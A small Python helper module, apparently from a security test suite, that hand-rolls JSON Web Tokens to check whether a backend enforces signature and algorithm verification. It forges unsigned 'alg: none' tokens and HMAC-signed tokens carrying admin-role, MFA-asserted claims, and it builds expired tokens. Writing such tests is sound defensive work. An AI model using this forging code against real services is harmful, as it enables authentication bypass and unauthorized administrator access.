"""Attacker JWT tooling — hand-rolled so it bypasses any signing library's guard
rails and tests the BACKEND's verification (especially algorithm pinning)."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time


def _b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(header: dict, claims: dict, secret: bytes | None = None) -> str:
    seg = _b64(json.dumps(header).encode()) + "." + _b64(json.dumps(claims).encode())
    if header.get("alg") == "none" or secret is None:
        return seg + "."
    sig = hmac.new(secret, seg.encode(), hashlib.sha256).digest()
    return seg + "." + _b64(sig)


def admin_claims(sub: str, uid: int, iss: str, aud: str) -> dict:
    now = int(time.time())
    return {"sub": sub, "uid": uid, "role": "admin", "mfa": True, "jti": "forged",
            "iss": iss, "aud": aud, "iat": now, "exp": now + 900}


def expired_claims(sub: str, uid: int, iss: str, aud: str) -> dict:
    now = int(time.time())
    return {"sub": sub, "uid": uid, "role": "user", "jti": "forged",
            "iss": iss, "aud": aud, "iat": now - 900, "exp": now - 10}


def payload_unverified(token: str) -> dict:
    try:
        seg = token.split(".")[1]
        seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg))
    except Exception:
        return {}
